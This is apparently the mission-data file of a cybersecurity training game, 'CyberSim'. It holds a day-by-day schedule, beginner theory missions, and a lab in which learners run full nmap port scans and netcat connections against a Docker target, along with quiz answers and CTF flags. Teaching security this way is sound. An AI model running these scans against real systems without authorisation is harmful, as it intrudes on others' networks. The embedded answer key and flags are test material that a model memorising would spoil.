"""
CyberSim Mission Data — ALL 365 Days
Comprehensive 3-tier difficulty data for every mission.
Each mission has Easy/Normal/Hard with different methods, tools, guides, security, and flags.
"""

# ─── Mission Types ────────────────────────────────────────────────────────────
from core.mission_types import TYPE_LAB, TYPE_THEORY, TYPE_PROJECT, TYPE_CAREER, TYPE_EXTERNAL

# ═══════════════════════════════════════════════════════════════════════════════
#  DAILY SCHEDULE — Maps every day (1-365) to a mission ID
# ═══════════════════════════════════════════════════════════════════════════════
DAILY_SCHEDULE = {
    # ── Phase 0: Days 1-5 — Absolute Beginner Intro ──
    1: 1, 2: 1,          # What is Cybersecurity?
    3: 2, 4: 2,          # What is an IP Address & Port?
    5: 3,                 # Kali Linux Tool Tour
    # ── Phase 1: Month 1 — Networking (Days 6-30) ──
    6: 102, 7: 102, 8: 102, 9: 102,        # OSI Model (theory FIRST)
    10: 104, 11: 104,                       # TCP/UDP Protocol (theory)
    12: 101, 13: 101, 14: 101,             # Network Recon (NOW user knows what ports are)
    15: 103, 16: 103, 17: 103,             # Nmap OS Fingerprinting
    18: 106, 19: 106, 20: 106,             # Subnetting Mastery (theory)
    21: 105, 22: 105,                       # Vuln Scanning with NSE
    23: 107, 24: 107, 25: 107,             # DNS & DHCP Enumeration
    26: 108, 27: 108,                       # Wireshark Theory
    28: 109, 29: 109, 30: 109,             # PCAP Forensic Analysis
    # ── Phase 1: Month 2 — Linux REORDERED (Days 31-60) ──
    # Theory first, then basic labs, advanced ones moved to later phases
    31: 204, 32: 204, 33: 204, 34: 204, 35: 204,   # File Hierarchy & Users (theory FIRST)
    36: 201, 37: 201, 38: 201,                       # Hidden Files Hunt (basic lab)
    39: 203, 40: 203, 41: 203,                       # The Grep Hunt (basic lab)
    42: 206, 43: 206, 44: 206, 45: 206, 46: 206,   # Bash Scripting (theory)
    47: 208, 48: 208, 49: 208, 50: 208, 51: 208,   # SSH Tunneling (moderate lab)
    # Days 52-60: Theory review days (no mission — theory study from resources)
    52: 204, 53: 206, 54: 204, 55: 206,
    56: 208, 57: 208, 58: 208, 59: 208, 60: 208,
    # ── Phase 1: Month 3 — Python (Days 61-90) ──
    61: 301, 62: 301, 63: 301, 64: 301, 65: 301,
    66: 302,
    67: 303, 68: 303, 69: 303, 70: 303,
    71: 304, 72: 304, 73: 304, 74: 304, 75: 304,
    76: 305, 77: 305, 78: 305, 79: 305, 80: 305,
    81: 306, 82: 306, 83: 306, 84: 306, 85: 306,
    86: 307, 87: 307, 88: 307, 89: 307, 90: 307,
    # ── Phase 2: Month 4 — Security+ Theory (Days 91-120) ──
    91: 401, 92: 401, 93: 401, 94: 401, 95: 401,
    96: 401, 97: 401, 98: 401, 99: 401, 100: 401,
    101: 402, 102: 402, 103: 402, 104: 402, 105: 402,
    106: 402, 107: 402, 108: 402, 109: 402, 110: 402,
    111: 403, 112: 403, 113: 403, 114: 403, 115: 403,
    116: 403, 117: 403, 118: 403, 119: 403, 120: 403,
    # ── Phase 3: Month 5 — Privilege Escalation (Days 121-150) ──
    # Mission 202 (Linux PrivEsc) now starts HERE where it belongs
    121: 202, 122: 202, 123: 202,                     # Linux PrivEsc (moved from Day 32!)
    124: 501, 125: 501,                                # SUID Hunt
    126: 502, 127: 502,                                # Cron Jobs Chaos
    128: 503, 129: 503,                                # Sudo Exploitation
    130: 504, 131: 504, 132: 504, 133: 504, 134: 504, # Kernel Privileges Theory
    135: 505, 136: 505, 137: 505, 138: 505,           # PATH Variable Exploitation
    139: 506, 140: 506, 141: 506, 142: 506,           # Wildcard Injection
    143: 507, 144: 507, 145: 507, 146: 507, 147: 507, # Kernel Exploits
    148: 507, 149: 507, 150: 507,
    # ── Phase 2: Month 6 — Cryptography (Days 151-180) ──
    151: 601, 152: 602, 153: 603,
    154: 604, 155: 604, 156: 604, 157: 604, 158: 604, 159: 604, 160: 604,
    161: 605, 162: 605, 163: 605, 164: 605, 165: 605,
    166: 606, 167: 606, 168: 606, 169: 606, 170: 606,
    171: 607, 172: 607, 173: 607, 174: 607, 175: 607,
    176: 607, 177: 607, 178: 607, 179: 607, 180: 607,
    # ── Phase 3: Month 7 — Web Security (Days 181-210) ──
    181: 701, 182: 701, 183: 701, 184: 701, 185: 701,
    186: 702, 187: 702, 188: 702, 189: 702, 190: 702,
    191: 703, 192: 704,
    193: 705, 194: 705, 195: 705, 196: 705, 197: 705, 198: 705, 199: 705, 200: 705,
    201: 706, 202: 706, 203: 706, 204: 706, 205: 706,
    206: 706, 207: 706, 208: 706, 209: 706, 210: 706,
    # ── Phase 4: Month 8 — TryHackMe (Days 211-240) ──
    211: 801, 212: 801, 213: 801, 214: 801, 215: 801,
    216: 801, 217: 801, 218: 801, 219: 801, 220: 801,
    221: 802, 222: 802, 223: 802, 224: 802, 225: 802,
    226: 802, 227: 802, 228: 802, 229: 802, 230: 802,
    231: 803, 232: 803, 233: 803, 234: 803, 235: 803,
    236: 803, 237: 803, 238: 803, 239: 803, 240: 803,
    # ── Phase 4: Month 9 — HackTheBox (Days 241-270) ──
    241: 804, 242: 804, 243: 804, 244: 804, 245: 804,
    246: 804, 247: 804, 248: 804, 249: 804, 250: 804,
    251: 805, 252: 805, 253: 805, 254: 805, 255: 805,
    256: 805, 257: 805, 258: 805, 259: 805, 260: 805,
    261: 806, 262: 806, 263: 806, 264: 806, 265: 806,
    266: 806, 267: 806, 268: 806, 269: 806, 270: 806,
    # ── Phase 4: Month 10 — WiFi/Cloud (Days 271-300) ──
    271: 901, 272: 901, 273: 901, 274: 901, 275: 901,
    276: 901, 277: 901, 278: 901, 279: 901, 280: 901,
    281: 901, 282: 901, 283: 901, 284: 901, 285: 901,
    286: 902, 287: 902, 288: 902, 289: 902, 290: 902,
    291: 902, 292: 902, 293: 902, 294: 902, 295: 902,
    296: 902, 297: 902, 298: 902, 299: 902, 300: 902,
    # ── Phase 4: Month 11 — Portfolio & Bug Bounty (Days 301-330) ──
    301: 903, 302: 903, 303: 903, 304: 903, 305: 903,
    306: 903, 307: 903, 308: 903, 309: 903, 310: 903,
    311: 904, 312: 904, 313: 904, 314: 904, 315: 904,
    316: 904, 317: 904, 318: 904, 319: 904, 320: 904,
    321: 905, 322: 905, 323: 905, 324: 905, 325: 905,
    326: 905, 327: 905, 328: 905, 329: 905, 330: 905,
    # ── Phase 4: Month 12 — Job Hunt (Days 331-365) ──
    331: 906, 332: 906, 333: 906, 334: 906, 335: 906,
    336: 906, 337: 906, 338: 906, 339: 906, 340: 906,
    341: 907, 342: 907, 343: 907, 344: 907, 345: 907,
    346: 907, 347: 907, 348: 907, 349: 907, 350: 907,
    351: 908, 352: 908, 353: 908, 354: 908, 355: 908,
    356: 908, 357: 908, 358: 908, 359: 908, 360: 908,
    361: 908, 362: 908, 363: 908, 364: 908,
    365: 909,
    # ══════════════════════════════════════════════════════════════════════════
    #  STAGE 3 — PROFESSIONAL (Days 366-545)
    # ══════════════════════════════════════════════════════════════════════════
    # ── Month 13: Active Directory (Days 366-395) ──
    366: 1001, 367: 1001, 368: 1001, 369: 1001, 370: 1001,
    371: 1001, 372: 1001, 373: 1001, 374: 1001, 375: 1001,
    376: 1002, 377: 1002, 378: 1002, 379: 1002, 380: 1002,
    381: 1002, 382: 1002, 383: 1002, 384: 1002, 385: 1002,
    386: 1002, 387: 1002, 388: 1002, 389: 1002, 390: 1002,
    391: 1002, 392: 1002, 393: 1002, 394: 1002, 395: 1002,
    # ── Month 14: Buffer Overflow (Days 396-425) ──
    396: 1003, 397: 1003, 398: 1003, 399: 1003, 400: 1003,
    401: 1004, 402: 1004, 403: 1004, 404: 1004, 405: 1004,
    406: 1004, 407: 1004, 408: 1004, 409: 1004, 410: 1004,
    411: 1004, 412: 1004, 413: 1004, 414: 1004, 415: 1004,
    416: 1004, 417: 1004, 418: 1004, 419: 1004, 420: 1004,
    421: 1004, 422: 1004, 423: 1004, 424: 1004, 425: 1004,
    # ── Month 15-16: Blue Team SOC + Log Wiping moved here (Days 426-485) ──
    426: 1005, 427: 1005, 428: 1005, 429: 1005, 430: 1005,
    431: 1005, 432: 1005, 433: 1005, 434: 1005, 435: 1005,
    436: 1005, 437: 1005, 438: 1005, 439: 1005, 440: 1005,
    441: 1006, 442: 1006, 443: 1006, 444: 1006, 445: 1006,
    446: 1006, 447: 1006, 448: 1006, 449: 1006, 450: 1006,
    451: 1006, 452: 1006, 453: 1006, 454: 1006, 455: 1006,
    456: 207, 457: 207, 458: 207, 459: 207, 460: 207,   # Log Wiping (moved from Day 51 → Phase 7!)
    461: 1007, 462: 1007, 463: 1007, 464: 1007, 465: 1007,
    466: 1007, 467: 1007, 468: 1007, 469: 1007, 470: 1007,
    471: 1007, 472: 1007, 473: 1007, 474: 1007, 475: 1007,
    476: 1007, 477: 1007, 478: 1007, 479: 1007, 480: 1007,
    481: 1007, 482: 1007, 483: 1007, 484: 1007, 485: 1007,
    # ══════════════════════════════════════════════════════════════════════════
    #  STAGE 4 — EXPERT (Days 486-730)
    # ══════════════════════════════════════════════════════════════════════════
    # ── Month 17-18: Process Injection (moved here) + Malware Dev (Days 486-545) ──
    486: 205, 487: 205, 488: 205, 489: 205, 490: 205,   # Process Injection (moved from Day 41 → Phase 6!)
    491: 1101, 492: 1101, 493: 1101, 494: 1101, 495: 1101,
    496: 1101, 497: 1101, 498: 1101, 499: 1101, 500: 1101,
    501: 1101, 502: 1101, 503: 1101, 504: 1101, 505: 1101,
    506: 1101, 507: 1101, 508: 1101, 509: 1101, 510: 1101,
    511: 1101, 512: 1101, 513: 1101, 514: 1101, 515: 1101,
    516: 1102, 517: 1102, 518: 1102, 519: 1102, 520: 1102,
    521: 1102, 522: 1102, 523: 1102, 524: 1102, 525: 1102,
    526: 1102, 527: 1102, 528: 1102, 529: 1102, 530: 1102,
    531: 1102, 532: 1102, 533: 1102, 534: 1102, 535: 1102,
    536: 1102, 537: 1102, 538: 1102, 539: 1102, 540: 1102,
    541: 1102, 542: 1102, 543: 1102, 544: 1102, 545: 1102,
    # ── Month 19-20: EDR Evasion + C2 (Days 546-625) ──
    546: 1103, 547: 1103, 548: 1103, 549: 1103, 550: 1103,
    551: 1103, 552: 1103, 553: 1103, 554: 1103, 555: 1103,
    556: 1103, 557: 1103, 558: 1103, 559: 1103, 560: 1103,
    561: 1103, 562: 1103, 563: 1103, 564: 1103, 565: 1103,
    566: 1103, 567: 1103, 568: 1103, 569: 1103, 570: 1103,
    571: 1103, 572: 1103, 573: 1103, 574: 1103, 575: 1103,
    576: 1104, 577: 1104, 578: 1104, 579: 1104, 580: 1104,
    581: 1104, 582: 1104, 583: 1104, 584: 1104, 585: 1104,
    586: 1104, 587: 1104, 588: 1104, 589: 1104, 590: 1104,
    591: 1104, 592: 1104, 593: 1104, 594: 1104, 595: 1104,
    596: 1104, 597: 1104, 598: 1104, 599: 1104, 600: 1104,
    601: 1104, 602: 1104, 603: 1104, 604: 1104, 605: 1104,
    606: 1104, 607: 1104, 608: 1104, 609: 1104, 610: 1104,
    611: 1104, 612: 1104, 613: 1104, 614: 1104, 615: 1104,
    616: 1104, 617: 1104, 618: 1104, 619: 1104, 620: 1104,
    621: 1104, 622: 1104, 623: 1104, 624: 1104, 625: 1104,
    # ── Month 21-24: Cert Prep + Career (Days 626-730) ──
    626: 1105, 627: 1105, 628: 1105, 629: 1105, 630: 1105,
    631: 1105, 632: 1105, 633: 1105, 634: 1105, 635: 1105,
    636: 1105, 637: 1105, 638: 1105, 639: 1105, 640: 1105,
    641: 1105, 642: 1105, 643: 1105, 644: 1105, 645: 1105,
    646: 1105, 647: 1105, 648: 1105, 649: 1105, 650: 1105,
    651: 1105, 652: 1105, 653: 1105, 654: 1105, 655: 1105,
    656: 1105, 657: 1105, 658: 1105, 659: 1105, 660: 1105,
    661: 1105, 662: 1105, 663: 1105, 664: 1105, 665: 1105,
    666: 1105, 667: 1105, 668: 1105, 669: 1105, 670: 1105,
    671: 1105, 672: 1105, 673: 1105, 674: 1105, 675: 1105,
    676: 1105, 677: 1105, 678: 1105, 679: 1105, 680: 1105,
    681: 1105, 682: 1105, 683: 1105, 684: 1105, 685: 1105,
    686: 1105, 687: 1105, 688: 1105, 689: 1105, 690: 1105,
    691: 1105, 692: 1105, 693: 1105, 694: 1105, 695: 1105,
    696: 1105, 697: 1105, 698: 1105, 699: 1105, 700: 1105,
    701: 1105, 702: 1105, 703: 1105, 704: 1105, 705: 1105,
    706: 1105, 707: 1105, 708: 1105, 709: 1105, 710: 1105,
    711: 1105, 712: 1105, 713: 1105, 714: 1105, 715: 1105,
    716: 1105, 717: 1105, 718: 1105, 719: 1105, 720: 1105,
    721: 1105, 722: 1105, 723: 1105, 724: 1105, 725: 1105,
    726: 1105, 727: 1105, 728: 1105, 729: 1105, 730: 1105,
}


def get_mission_for_day(day: int):
    """Return the mission ID for a given day, or None."""
    return DAILY_SCHEDULE.get(day)


def get_mission(mission_id: int):
    """Return full mission data dict for a given mission ID."""
    m = MISSIONS.get(mission_id)
    if m:
        return m
    # Check Stage 3-4 missions
    from core.mission_data_stage34 import STAGE3_MISSIONS, STAGE4_MISSIONS
    m = STAGE3_MISSIONS.get(mission_id)
    if m:
        return m
    return STAGE4_MISSIONS.get(mission_id)


# ═══════════════════════════════════════════════════════════════════════════════
#                    PHASE 0 — ABSOLUTE BEGINNER INTRO (Days 1-5)
# ═══════════════════════════════════════════════════════════════════════════════

MISSIONS = {

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 001: What is Cybersecurity? (Day 1-2)
# ──────────────────────────────────────────────────────────────────────────────
1: {
    "id": 1,
    "name": "What is Cybersecurity?",
    "type": TYPE_THEORY,
    "phase": 0,
    "diagram": (
        "┌─────────────────────────────────────────────────────────────────────┐\n"
        "│                     🛡️  CYBERSECURITY OVERVIEW                     │\n"
        "├─────────────────────────────────────────────────────────────────────┤\n"
        "│                                                                     │\n"
        "│   ┌──────────────┐     PROTECTS      ┌──────────────────────┐      │\n"
        "│   │  PEOPLE      │ ──────────────────▶│  DATA                │      │\n"
        "│   │  (Users,     │                    │  (Personal, Financial│      │\n"
        "│   │   Employees) │                    │   Medical, Corporate)│      │\n"
        "│   └──────────────┘                    └──────────────────────┘      │\n"
        "│          │                                      │                   │\n"
        "│          ▼                                      ▼                   │\n"
        "│   ┌──────────────────────────────────────────────────────────┐      │\n"
        "│   │            CIA TRIAD (Core Principles)                   │      │\n"
        "│   │                                                          │      │\n"
        "│   │     🔒 Confidentiality    Only authorized access         │      │\n"
        "│   │     ✅ Integrity          Data is not tampered           │      │\n"
        "│   │     ⚡ Availability       Systems stay running           │      │\n"
        "│   └──────────────────────────────────────────────────────────┘      │\n"
        "│                          │                                          │\n"
        "│            ┌─────────────┴──────────────┐                          │\n"
        "│            ▼                             ▼                          │\n"
        "│   ┌────────────────────┐     ┌────────────────────┐                │\n"
        "│   │  🔴 RED TEAM       │     │  🔵 BLUE TEAM      │                │\n"
        "│   │  (OFFENSE)         │     │  (DEFENSE)          │                │\n"
        "│   │                    │     │                     │                │\n"
        "│   │ • Pentesting       │     │ • SOC Monitoring    │                │\n"
        "│   │ • Vuln Assessment  │     │ • Incident Response │                │\n"
        "│   │ • Social Engineer  │     │ • Malware Analysis  │                │\n"
        "│   │ • Exploit Dev      │     │ • Threat Hunting    │                │\n"
        "│   │ • Physical Security│     │ • Digital Forensics │                │\n"
        "│   └────────────────────┘     └─────────────────────┘               │\n"
        "│                                                                     │\n"
        "│   ┌──────────────────────────────────────────────────────────┐      │\n"
        "│   │  🟣 PURPLE TEAM = Red + Blue working TOGETHER           │      │\n"
        "│   │     → Red attacks, Blue defends, both learn & improve   │      │\n"
        "│   └──────────────────────────────────────────────────────────┘      │\n"
        "│                                                                     │\n"
        "│   ┌──────────────────────────────────────────────────────────┐      │\n"
        "│   │  ⚠️  COMMON THREAT ACTORS                                │      │\n"
        "│   │                                                          │      │\n"
        "│   │  Script Kiddies → Hacktivists → Cybercriminals           │      │\n"
        "│   │       → Insiders → Nation-State (APT) Groups             │      │\n"
        "│   └──────────────────────────────────────────────────────────┘      │\n"
        "└─────────────────────────────────────────────────────────────────────┘"
    ),
    "resources": [
        # ── VIDEO LECTURES ──
        {
            "name": "Cybersecurity In 5 Minutes — Simplilearn",
            "type": "video",
            "path": "https://www.youtube.com/watch?v=inWWhr5tnEA",
            "description": "FREE — Quick animated intro to cybersecurity concepts",
        },
        {
            "name": "What is Ethical Hacking? — NetworkChuck",
            "type": "video",
            "path": "https://www.youtube.com/watch?v=fNzpcB7ODxQ",
            "description": "FREE — Fun and energetic intro to ethical hacking",
        },
        {
            "name": "IP Addresses Explained — PowerCert",
            "type": "video",
            "path": "https://www.youtube.com/watch?v=7_-qWlvQQtY",
            "description": "FREE — Visual explanation of how IP addresses work",
        },
        {
            "name": "Ports Explained — PowerCert",
            "type": "video",
            "path": "https://www.youtube.com/watch?v=g2fT-g9PX9o",
            "description": "FREE — Visual explanation of network ports",
        },
        {
            "name": "Kali Linux Full Beginner Tutorial — NetworkChuck",
            "type": "video",
            "path": "https://www.youtube.com/watch?v=lZAoFs75_cs",
            "description": "FREE — Complete Kali Linux walkthrough for beginners",
        },
        {
            "name": "Top 10 Kali Linux Tools — The Cyber Mentor",
            "type": "video",
            "path": "https://www.youtube.com/watch?v=wBp0Rb-ZJak",
            "description": "FREE — Must-know tools every hacker uses",
        },
        # ── PDF / WEB MATERIALS ──
        {
            "name": "NIST Cybersecurity Glossary",
            "type": "link",
            "path": "https://csrc.nist.gov/glossary",
            "description": "FREE — Official glossary of all cybersecurity terms",
        },
        {
            "name": "Cybrary — Free Cybersecurity Intro Course",
            "type": "link",
            "path": "https://www.cybrary.it/course/introduction-to-it-and-cybersecurity",
            "description": "FREE — Structured online course for absolute beginners",
        },
        # ── HANDS-ON LABS ──
        {
            "name": "TryHackMe — Intro to Cyber Security",
            "type": "link",
            "path": "https://tryhackme.com/path/outline/introtocyber",
            "description": "FREE — Interactive learning path covering cybersecurity fundamentals",
        },
        {
            "name": "TryHackMe — What is Networking?",
            "type": "link",
            "path": "https://tryhackme.com/room/whatisnetworking",
            "description": "FREE — Hands-on networking basics lab",
        },
        {
            "name": "TryHackMe — Linux Fundamentals 1",
            "type": "link",
            "path": "https://tryhackme.com/room/linuxfundamentalspart1",
            "description": "FREE — Learn the Linux command line from scratch",
        },
        # ── PDF MATERIALS (Google Drive) ──
        {
            "name": "Quick Start: Cyber Security Fundamentals (PDF)",
            "type": "pdf",
            "path": "https://drive.google.com/drive/folders/1AfQqDjo6809BkWtF3yyBlYb2k-hr2Z8m?usp=drive_link",
            "description": "Fast 30-min overview covering definitions, threats, and defense basics. Start here!",
        },
        {
            "name": "Deep Dive: Introduction to Cyber Security (PDF)",
            "type": "pdf",
            "path": "https://drive.google.com/drive/folders/1AfQqDjo6809BkWtF3yyBlYb2k-hr2Z8m?usp=drive_link",
            "description": "Comprehensive textbook-level introduction. Read this for in-depth understanding.",
        },
    ],
    "easy": {
        "briefing": (
            "Welcome to CyberSim! Before we hack anything, let's understand\n"
            "what cybersecurity actually IS and why it matters.\n\n"
            "Cybersecurity is the practice of protecting computers, networks,\n"
            "programs, and data from unauthorized access or attacks.\n\n"
            "There are two main sides:\n"
            "  🔴 OFFENSE (Red Team) = Ethical hackers who find vulnerabilities\n"
            "  🔵 DEFENSE (Blue Team) = Security analysts who detect and stop attacks\n\n"
            "In this 2-year journey, you'll master BOTH sides.\n\n"
            "Key Concept: The CIA Triad\n"
            "  🔒 Confidentiality — Only authorized people can access the data\n"
            "  ✅ Integrity       — Data hasn't been tampered with\n"
            "  ⚡ Availability    — Systems are up and running when needed"
        ),
        "objective": "Understand the CIA Triad, difference between Red Team & Blue Team, and common attack types.",
        "topics": [
            "CIA Triad: Confidentiality, Integrity, Availability — the 3 pillars of security",
            "Red Team (Offense): Penetration testing, vulnerability scanning, ethical hacking",
            "Blue Team (Defense): SOC analysts, incident response, monitoring, threat hunting",
            "Purple Team: Red + Blue collaborate to improve overall security posture",
            "Common attacks: Phishing, Malware, Ransomware, DDoS, SQL Injection, XSS",
            "Threat Actors: Script Kiddies → Hacktivists → Cybercriminals → APT (Nation-State)",
            "Frameworks: MITRE ATT&CK, NIST, OWASP Top 10",
            "Career paths: Pentester, SOC Analyst, DFIR, DevSecOps, Bug Bounty Hunter, CISO",
        ],
        "step_by_step_guide": (
            "STEP 1: Read the briefing and study the Concept Map diagram above.\n"
            "STEP 2: Open the Quick Start PDF (osou-dcs-02-cyber-security.pdf) for a fast overview.\n"
            "STEP 3: Google 'MITRE ATT&CK framework' and explore it for 10 minutes.\n"
            "STEP 4: Watch any 'What is Ethical Hacking?' video on YouTube (10-15 min).\n"
            "STEP 5: Write down: (a) which career path interests you, (b) Red or Blue team?\n"
            "STEP 6: Answer the quiz questions below to complete this mission."
        ),
        "quiz": [
            ("What does CIA stand for in cybersecurity?", "confidentiality integrity availability"),
            ("What team FINDS vulnerabilities — Red or Blue?", "red"),
            ("What team DEFENDS against attacks — Red or Blue?", "blue"),
            ("Name one common type of cyber attack", "phishing"),
        ],
        "xp_reward": 50,
    },
    "normal": {
        "briefing": (
            "Now go deeper into cybersecurity concepts. Study the differences between\n"
            "various threat actor types, understand how the MITRE ATT&CK framework\n"
            "categorizes attack techniques, and explore real-world breach case studies.\n\n"
            "For detailed understanding, open the full Introduction to Cyber Security PDF."
        ),
        "objective": "Explain 5 categories of threat actors and describe what the MITRE ATT&CK framework is used for.",
        "topics": [
            "Threat Actor Categories: Script Kiddies, Hacktivists, Cybercriminals, Insiders, Nation-State APTs",
            "MITRE ATT&CK: Tactics, Techniques, and Procedures (TTPs) mapped by adversary behavior",
            "Cyber Kill Chain: Recon → Weaponize → Deliver → Exploit → Install → C2 → Action",
            "Real breaches: Equifax (2017), SolarWinds (2020), Colonial Pipeline (2021)",
            "Security Certifications: CompTIA Security+, CEH, PNPT, OSCP, CRTO",
        ],
        "step_by_step_guide": (
            "STEP 1: Open 'Introduction-cyber-security.pdf' and read Chapters 1-3.\n"
            "STEP 2: Visit https://attack.mitre.org and explore 3 different Tactics.\n"
            "STEP 3: Research one real-world breach (e.g., Equifax or SolarWinds).\n"
            "STEP 4: Write a 5-sentence summary of what you learned today.\n"
            "STEP 5: Answer the quiz questions below."
        ),
        "quiz": [
            ("What framework maps adversary behavior into Tactics and Techniques?", "mitre att&ck"),
            ("What is the first phase of the Cyber Kill Chain?", "reconnaissance"),
            ("What type of threat actor is funded by governments?", "nation-state"),
            ("What year was the SolarWinds supply chain attack?", "2020"),
        ],
        "xp_reward": 75,
    },
    "hard": {
        "briefing": (
            "Expert-level study: analyze the differences between risk frameworks\n"
            "(NIST, ISO 27001, CIS Controls), understand Cyber Threat Intelligence\n"
            "(CTI), and explain the Diamond Model of intrusion analysis.\n\n"
            "Read both PDFs completely and supplement with external research."
        ),
        "objective": "Compare NIST vs ISO 27001 frameworks. Explain the Diamond Model. Describe CTI lifecycle.",
        "topics": [
            "NIST Cybersecurity Framework: Identify, Protect, Detect, Respond, Recover",
            "ISO 27001: International standard for Information Security Management Systems (ISMS)",
            "CIS Controls: Top 18 prioritized security actions",
            "Diamond Model: Adversary ↔ Infrastructure ↔ Capability ↔ Victim",
            "Threat Intelligence Lifecycle: Direction → Collection → Processing → Analysis → Dissemination",
            "Zero Trust Architecture: Never trust, always verify",
        ],
        "step_by_step_guide": (
            "STEP 1: Read both PDFs cover to cover.\n"
            "STEP 2: Research the NIST Cybersecurity Framework 5 functions.\n"
            "STEP 3: Compare NIST vs ISO 27001 — what's the key difference?\n"
            "STEP 4: Draw the Diamond Model on paper and explain each node.\n"
            "STEP 5: Answer the quiz questions below."
        ),
        "quiz": [
            ("Name the 5 NIST framework functions", "identify protect detect respond recover"),
            ("What model uses Adversary, Infrastructure, Capability, and Victim?", "diamond model"),
            ("What principle says 'never trust, always verify'?", "zero trust"),
        ],
        "xp_reward": 100,
    },
},

2: {
    "id": 2,
    "name": "What is an IP Address & Port?",
    "type": TYPE_THEORY,
    "phase": 0,
    "easy": {
        "briefing": (
            "Before you can scan a network, you need to understand what IP addresses\n"
            "and ports are. Think of it like this:\n\n"
            "IP Address = the STREET ADDRESS of a computer (e.g., 192.168.1.100)\n"
            "Port = the DOOR NUMBER on that address (e.g., port 80 = web, port 22 = SSH)\n\n"
            "Every device on a network has an IP. Every service uses a port."
        ),
        "objective": "Learn what IP addresses, ports, and protocols (TCP/UDP) are.",
        "topics": [
            "IPv4: 4 numbers 0-255 separated by dots (e.g., 10.0.0.1)",
            "Common ports: 22=SSH, 80=HTTP, 443=HTTPS, 21=FTP, 3306=MySQL",
            "TCP vs UDP: TCP = reliable (handshake), UDP = fast (no handshake)",
            "Private IPs: 10.x.x.x, 172.16-31.x.x, 192.168.x.x",
            "Your IP: run 'ip addr' or 'ifconfig' to see yours",
        ],
        "step_by_step_guide": (
            "STEP 1: Open a terminal and type: ip addr\n"
            "STEP 2: Find your IP address (look for 'inet' under eth0 or wlan0).\n"
            "STEP 3: Type: ping 8.8.8.8 — this pings Google's DNS server.\n"
            "STEP 4: Type: ss -tlnp — this shows all open ports on YOUR machine.\n"
            "STEP 5: Write down 5 common ports and what they do."
        ),
        "quiz": [("Default port for SSH?", "22"), ("Default port for HTTP?", "80")],
        "security_level": "Theory Mission — No active target",
        "flag": "FLAG{ip_and_ports_basics_2024}",
        "xp_reward": 50,
    },
    "normal": {"briefing": "Same as easy.", "objective": "Same.", "topics": [], "step_by_step_guide": "", "quiz": [], "security_level": "Theory Mission — No active target", "flag": "FLAG{ip_ports_normal_2024}", "xp_reward": 50},
    "hard": {"briefing": "Same as easy.", "objective": "Same.", "topics": [], "step_by_step_guide": "", "quiz": [], "security_level": "Theory Mission — No active target", "flag": "FLAG{ip_ports_hard_2024}", "xp_reward": 50},
},

3: {
    "id": 3,
    "name": "Kali Linux Tool Tour",
    "type": TYPE_THEORY,
    "phase": 0,
    "easy": {
        "briefing": (
            "Kali Linux is YOUR hacking operating system. It comes pre-installed with\n"
            "600+ security tools. Today you'll explore the most important ones.\n\n"
            "Don't worry about mastering them — just know they EXIST and what they do.\n"
            "You'll use each one in depth during future missions."
        ),
        "objective": "Explore Kali Linux and identify the top 10 tools you'll use most.",
        "topics": [
            "Nmap: Network scanner — finds open ports and services",
            "Burp Suite: Web proxy — intercepts and modifies web traffic",
            "Metasploit: Exploit framework — automates attacks",
            "John the Ripper / Hashcat: Password crackers",
            "Wireshark: Packet analyzer — captures network traffic",
            "Gobuster/Dirb: Directory bruteforcer for websites",
            "SQLmap: Automated SQL injection tool",
            "Hydra: Online brute-force password cracker",
            "Netcat (nc): Swiss army knife of networking",
            "Aircrack-ng: WiFi hacking suite",
        ],
        "step_by_step_guide": (
            "STEP 1: Open your Kali Linux terminal.\n"
            "STEP 2: Type: which nmap — confirms Nmap is installed.\n"
            "STEP 3: Type: nmap --help | head -20 — see Nmap's options.\n"
            "STEP 4: Type: msfconsole — open Metasploit (type 'exit' to close).\n"
            "STEP 5: Type: burpsuite & — open Burp Suite GUI.\n"
            "STEP 6: Explore the Kali menu → find the 'Information Gathering' section.\n"
            "STEP 7: Write down 5 tools you're most excited to learn."
        ),
        "quiz": [("Tool for scanning ports?", "nmap"), ("Tool for intercepting web traffic?", "burp suite")],
        "security_level": "Theory Mission — No active target",
        "flag": "FLAG{kali_tools_tour_2024}",
        "xp_reward": 50,
    },
    "normal": {"briefing": "Same as easy.", "objective": "Same.", "topics": [], "step_by_step_guide": "", "quiz": [], "security_level": "Theory Mission — No active target", "flag": "FLAG{kali_tools_normal_2024}", "xp_reward": 50},
    "hard": {"briefing": "Same as easy.", "objective": "Same.", "topics": [], "step_by_step_guide": "", "quiz": [], "security_level": "Theory Mission — No active target", "flag": "FLAG{kali_tools_hard_2024}", "xp_reward": 50},
},

# ═══════════════════════════════════════════════════════════════════════════════
#                    PHASE 1 — NETWORKING (Days 6-30)
# ═══════════════════════════════════════════════════════════════════════════════

# ──────────────────────────────────────────────────────────────────────────────
#  MISSION 101: The Network Recon
# ──────────────────────────────────────────────────────────────────────────────
101: {
    "id": 101,
    "name": "The Network Recon",
    "type": TYPE_LAB,
    "phase": 1,
    "docker_image": "networking_lab",
    "container": "cybersim_network_target",
    "easy": {
        "briefing": (
            "A rogue server has appeared on the internal network. Your mission is to\n"
            "identify ALL open ports and find the hidden service running on a non-standard port.\n"
            "That service will give you the FLAG. This is your first real recon mission!\n\n"
            "In cybersecurity, reconnaissance (recon) is the FIRST step of any penetration test.\n"
            "You must map the target's attack surface before attempting any exploitation.\n"
            "Think of it like casing a bank before a heist — you need to know every door and window."
        ),
        "objective": "Scan all 65535 ports, identify the hidden service, connect to it, retrieve the flag.",
        "methods": [
            "Full TCP Connect Scan (-sT) — Completes the 3-way handshake on every port",
            "Service Version Detection (-sV) — Identifies what software is running on open ports",
            "Default Script Scan (-sC) — Runs safe NSE scripts for extra info",
        ],
        "tools": [
            {"name": "Nmap", "cmd": "nmap -sT -sV -sC -p- <TARGET_IP>", "desc": "Full TCP scan with version detection"},
            {"name": "Netcat", "cmd": "nc <TARGET_IP> <PORT>", "desc": "Connect to discovered services"},
            {"name": "Telnet", "cmd": "telnet <TARGET_IP> <PORT>", "desc": "Alternative connection method"},
        ],
        "step_by_step_guide": (
            "STEP 1: Open a new terminal on your Kali machine.\n"
            "STEP 2: Run a full port scan: nmap -sT -sV -p- <TARGET_IP>\n"
            "STEP 3: Wait for the scan to complete (this scans all 65535 ports).\n"
            "STEP 4: Look at the results — find any port above 9000 (non-standard).\n"
            "STEP 5: Connect to the hidden port: nc <TARGET_IP> 9999\n"
            "STEP 6: The service will display the FLAG. Copy it.\n"
            "STEP 7: Come back here and submit the FLAG."
        ),
